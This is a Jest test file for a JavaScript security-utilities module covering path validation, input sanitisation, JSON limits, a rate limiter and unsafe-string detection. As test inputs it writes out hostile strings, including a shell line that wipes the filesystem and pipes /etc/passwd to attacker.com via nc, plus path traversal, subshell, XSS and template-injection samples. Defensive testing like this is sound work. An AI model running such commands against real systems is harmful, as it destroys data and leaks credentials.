'use strict';

const path = require('path');

const {
  validatePath,
  sanitizeInput,
  validateJSON,
  RateLimiter,
  safePath,
  isSafeString,
  getObjectDepth,
} = require('../../../.aios-core/core/utils/security-utils');

describe('security-utils', () => {
  describe('validatePath', () => {
    it('should accept a simple relative path', () => {
      const result = validatePath('agents/dev.md');
      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject path traversal with ../', () => {
      const result = validatePath('../../../etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.errors).toEqual(
        expect.arrayContaining([expect.stringContaining('Path traversal')]),
      );
    });

    it('should reject null byte injection', () => {
      const result = validatePath('file.txt\0.exe');
      expect(result.valid).toBe(false);
      expect(result.errors).toEqual(
        expect.arrayContaining([expect.stringContaining('Null byte')]),
      );
    });

    it('should reject null/undefined/non-string input', () => {
      expect(validatePath(null).valid).toBe(false);
      expect(validatePath(undefined).valid).toBe(false);
      expect(validatePath('').valid).toBe(false);
      expect(validatePath(123).valid).toBe(false);
    });

    it('should reject absolute paths by default', () => {
      const result = validatePath('/etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.errors).toEqual(
        expect.arrayContaining([expect.stringContaining('Absolute paths')]),
      );
    });

    it('should allow absolute paths when allowAbsolute is true', () => {
      const result = validatePath('/usr/local/bin/node', { allowAbsolute: true });
      expect(result.valid).toBe(true);
    });

    it('should enforce basePath restriction (traversal)', () => {
      const result = validatePath('../../outside', { basePath: '/safe/dir' });
      expect(result.valid).toBe(false);
    });

    it('should enforce basePath restriction (absolute escape)', () => {
      // Use allowAbsolute + basePath to test basePath enforcement in isolation
      // (without path traversal detection masking the basePath check)
      const result = validatePath('/outside/secret.txt', {
        basePath: '/safe/dir',
        allowAbsolute: true,
      });
      expect(result.valid).toBe(false);
      expect(result.errors).toEqual(
        expect.arrayContaining([expect.stringContaining('escapes the allowed base')]),
      );
    });

    it('should allow paths within basePath', () => {
      const result = validatePath('sub/file.txt', { basePath: '/safe/dir' });
      expect(result.valid).toBe(true);
    });

    it('should return the normalized path', () => {
      const result = validatePath('agents/./dev.md');
      expect(result.normalized).toBe(path.normalize('agents/./dev.md'));
    });
  });

  describe('sanitizeInput', () => {
    it('should remove null bytes from all types', () => {
      expect(sanitizeInput('hello\0world', 'general')).not.toContain('\0');
      expect(sanitizeInput('file\0.txt', 'filename')).not.toContain('\0');
    });

    it('should return non-string input unchanged', () => {
      expect(sanitizeInput(42)).toBe(42);
      expect(sanitizeInput(null)).toBe(null);
      expect(sanitizeInput(undefined)).toBe(undefined);
    });

    describe('filename mode', () => {
      it('should replace unsafe filename characters with _', () => {
        expect(sanitizeInput('my file<>.txt', 'filename')).toBe('my_file__.txt');
      });

      it('should strip leading dots (hidden files)', () => {
        expect(sanitizeInput('.hidden', 'filename')).toBe('hidden');
        expect(sanitizeInput('...dots', 'filename')).toBe('dots');
      });

      it('should keep safe filename chars', () => {
        expect(sanitizeInput('my-file_v2.txt', 'filename')).toBe('my-file_v2.txt');
      });
    });

    describe('identifier mode', () => {
      it('should keep alphanumeric, dash, and underscore', () => {
        expect(sanitizeInput('my-agent_v2', 'identifier')).toBe('my-agent_v2');
      });

      it('should replace spaces and special chars', () => {
        expect(sanitizeInput('my agent!', 'identifier')).toBe('my_agent_');
      });
    });

    describe('shell mode', () => {
      it('should strip shell metacharacters', () => {
        const dangerous = 'rm -rf /; cat /etc/passwd | nc attacker.com 4444';
        const sanitized = sanitizeInput(dangerous, 'shell');
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('|');
      });

      it('should strip backticks and $() subshell syntax', () => {
        expect(sanitizeInput('$(whoami)', 'shell')).toBe('whoami');
        expect(sanitizeInput('`id`', 'shell')).toBe('id');
      });
    });

    describe('html mode', () => {
      it('should escape HTML entities', () => {
        const result = sanitizeInput('<script>alert("xss")</script>', 'html');
        expect(result).not.toContain('<script>');
        expect(result).toContain('&lt;script&gt;');
        expect(result).toContain('&quot;');
      });

      it('should escape single quotes and slashes', () => {
        const result = sanitizeInput("it's a /path", 'html');
        expect(result).toContain('&#x27;');
        expect(result).toContain('&#x2F;');
      });
    });

    describe('general mode', () => {
      it('should remove control characters but keep newlines and tabs', () => {
        const result = sanitizeInput('hello\x01\x02world\n\ttab', 'general');
        expect(result).toBe('helloworld\n\ttab');
      });
    });
  });

  describe('validateJSON', () => {
    it('should parse valid JSON', () => {
      const result = validateJSON('{"key": "value"}');
      expect(result.valid).toBe(true);
      expect(result.data).toEqual({ key: 'value' });
      expect(result.error).toBeNull();
    });

    it('should reject invalid JSON', () => {
      const result = validateJSON('{invalid}');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid JSON');
    });

    it('should reject null/undefined/non-string', () => {
      expect(validateJSON(null).valid).toBe(false);
      expect(validateJSON('').valid).toBe(false);
      expect(validateJSON(123).valid).toBe(false);
    });

    it('should reject JSON exceeding max size', () => {
      const largeJSON = JSON.stringify({ data: 'x'.repeat(200) });
      const result = validateJSON(largeJSON, { maxSize: 100 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('exceeds maximum size');
    });

    it('should reject deeply nested JSON', () => {
      // Build a nested object with depth > 3
      const nested = { a: { b: { c: { d: 'deep' } } } };
      const result = validateJSON(JSON.stringify(nested), { maxDepth: 2 });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('nesting depth');
    });

    it('should accept JSON within depth limit', () => {
      const shallow = { a: { b: 'ok' } };
      const result = validateJSON(JSON.stringify(shallow), { maxDepth: 5 });
      expect(result.valid).toBe(true);
    });
  });

  describe('getObjectDepth', () => {
    it('should return 0 for primitives', () => {
      expect(getObjectDepth('string')).toBe(0);
      expect(getObjectDepth(42)).toBe(0);
      expect(getObjectDepth(null)).toBe(0);
    });

    it('should return 0 for a flat object', () => {
      expect(getObjectDepth({ a: 1, b: 2 })).toBe(0);
    });

    it('should count nesting levels', () => {
      expect(getObjectDepth({ a: { b: 'v' } })).toBe(1);
      expect(getObjectDepth({ a: { b: { c: 'v' } } })).toBe(2);
    });

    it('should handle arrays', () => {
      expect(getObjectDepth([1, [2, [3]]])).toBe(2);
    });
  });

  describe('RateLimiter', () => {
    it('should allow requests under the limit', () => {
      const limiter = new RateLimiter({ maxRequests: 3, windowMs: 1000 });

      expect(limiter.check('user1').allowed).toBe(true);
      expect(limiter.check('user1').allowed).toBe(true);
      expect(limiter.check('user1').allowed).toBe(true);
    });

    it('should block requests over the limit', () => {
      const limiter = new RateLimiter({ maxRequests: 2, windowMs: 60000 });

      limiter.check('user1');
      limiter.check('user1');
      const third = limiter.check('user1');

      expect(third.allowed).toBe(false);
      expect(third.remaining).toBe(0);
      expect(third.retryAfter).toBeGreaterThan(0);
    });

    it('should track different keys independently', () => {
      const limiter = new RateLimiter({ maxRequests: 1, windowMs: 60000 });

      expect(limiter.check('user1').allowed).toBe(true);
      expect(limiter.check('user2').allowed).toBe(true);
      expect(limiter.check('user1').allowed).toBe(false);
    });

    it('should return remaining count', () => {
      const limiter = new RateLimiter({ maxRequests: 5, windowMs: 60000 });

      // remaining is calculated before the request is recorded
      const first = limiter.check('user1');
      expect(first.remaining).toBe(5);

      limiter.check('user1');
      const third = limiter.check('user1');
      expect(third.remaining).toBe(3);
    });

    it('should reset a specific key', () => {
      const limiter = new RateLimiter({ maxRequests: 1, windowMs: 60000 });

      limiter.check('user1');
      expect(limiter.check('user1').allowed).toBe(false);

      limiter.reset('user1');
      expect(limiter.check('user1').allowed).toBe(true);
    });

    it('should clear all keys', () => {
      const limiter = new RateLimiter({ maxRequests: 1, windowMs: 60000 });

      limiter.check('user1');
      limiter.check('user2');
      limiter.clear();

      expect(limiter.check('user1').allowed).toBe(true);
      expect(limiter.check('user2').allowed).toBe(true);
    });

    it('should clean up expired entries', () => {
      jest.useFakeTimers();
      try {
        const limiter = new RateLimiter({ maxRequests: 1, windowMs: 60000 });

        limiter.check('user1');
        expect(limiter.check('user1').allowed).toBe(false);

        // Advance past the window and trigger cleanup
        jest.advanceTimersByTime(60001);
        limiter.cleanup();

        // After cleanup, expired entry is removed so user1 can request again
        expect(limiter.check('user1').allowed).toBe(true);
      } finally {
        jest.useRealTimers();
      }
    });
  });

  describe('safePath', () => {
    it('should return a safe joined path', () => {
      const result = safePath('/base', 'sub', 'file.txt');
      expect(result).toBe(path.join('/base', 'sub', 'file.txt'));
    });

    it('should return null for path traversal attempts', () => {
      const result = safePath('/base', '..', '..', 'etc', 'passwd');
      expect(result).toBeNull();
    });

    it('should return null for paths escaping base', () => {
      const result = safePath('/base', '../../outside');
      expect(result).toBeNull();
    });
  });

  describe('isSafeString', () => {
    it('should return true for normal strings', () => {
      expect(isSafeString('hello world')).toBe(true);
      expect(isSafeString('agent-dev_v2')).toBe(true);
    });

    it('should return false for non-strings', () => {
      expect(isSafeString(42)).toBe(false);
      expect(isSafeString(null)).toBe(false);
      expect(isSafeString(undefined)).toBe(false);
    });

    it('should detect path traversal', () => {
      expect(isSafeString('../etc/passwd')).toBe(false);
    });

    it('should detect template injection', () => {
      expect(isSafeString('${process.env.SECRET}')).toBe(false);
    });

    it('should detect null bytes', () => {
      expect(isSafeString('file\0.exe')).toBe(false);
    });

    it('should detect control characters', () => {
      expect(isSafeString('hello\x01world')).toBe(false);
    });
  });
});
